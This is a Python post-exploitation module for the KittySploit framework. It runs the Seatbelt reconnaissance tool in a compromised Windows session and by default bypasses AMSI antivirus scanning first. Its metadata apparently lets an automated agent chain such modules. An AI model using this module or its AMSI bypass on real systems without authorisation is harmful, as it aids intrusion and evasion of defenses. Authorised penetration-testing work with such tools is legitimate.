#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Host situational awareness via Seatbelt loadmodule."""

from kittysploit import *

from lib.post.windows.loadmodule_helper import run_catalog_assembly
from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Seatbelt Recon (optional external)",
        "description": (
            "OPTIONAL: requires Seatbelt.exe in data/assemblies/. Prefer native "
            "post/shell/windows/gather modules (enum_system, privilege_escalation_surface, "
            "edr_audit, …). Seatbelt is a broad C# host checklist, not a credential dumper."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL, SessionType.POLLING],
        "references": [
            "https://github.com/GhostPack/Seatbelt",
            "https://attack.mitre.org/techniques/T1082/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 2,
            "reversible": False,
            "approval_required": True,
            "produces": ["recon"],
            "cost": 1.4,
            "noise": 0.55,
            "value": 0.5,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": ["host_recon"]},
        },
    }

    arguments = OptString(
        "-group=system",
        "Seatbelt args (e.g. -group=system, -group=user, -group=all, OSInfo)",
        False,
    )
    bypass_amsi = OptBool(True, "AMSI bypass before loadmodule", False)
    assembly = OptString("Seatbelt", "Catalog name or path for Seatbelt.exe", False)

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False

        args = str(self.arguments or "-group=system").strip()
        print_status(f"loadmodule {self.assembly} — {args}")
        print_info(
            "Seatbelt collects host info (OS, AV, interesting registry/files). "
            "It does not dump passwords."
        )
        try:
            out = run_catalog_assembly(
                self,
                str(self.assembly or "Seatbelt"),
                arguments=args,
                bypass_amsi=bool(self.bypass_amsi),
            )
        except FileNotFoundError as exc:
            raise ProcedureError(
                FailureType.NotFound,
                f"{exc}. Drop Seatbelt.exe into data/assemblies/ "
                "(https://github.com/GhostPack/Seatbelt).",
            ) from exc
        except Exception as exc:
            raise ProcedureError(FailureType.Unknown, f"Seatbelt failed: {exc}") from exc

        if out:
            print_success("Seatbelt finished")
            print_info(out)
        else:
            print_warning("No output returned")
        return True
